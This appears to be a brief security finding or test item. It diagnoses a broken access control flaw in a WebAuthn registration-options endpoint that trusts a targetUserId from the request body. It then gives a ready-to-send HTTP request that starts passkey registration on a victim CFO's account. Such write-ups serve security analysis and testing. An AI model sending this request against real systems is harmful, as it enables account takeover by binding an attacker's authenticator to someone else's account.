diagnosis: The registration options endpoint authenticates the caller via JWT but retrieves targetUserId from the request body rather than req.user.id. An attacker can supply a victim's user ID to initiate a passkey registration ceremony, enabling them to bind their own biometric authenticator or security key to the victim's account.
exploit_request:
POST /api/webauthn/register/options HTTP/1.1
Host: shield.enterprise.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"targetUserId": "usr_victim_cfo_4401", "username": "cfo@targetcorp.com"}
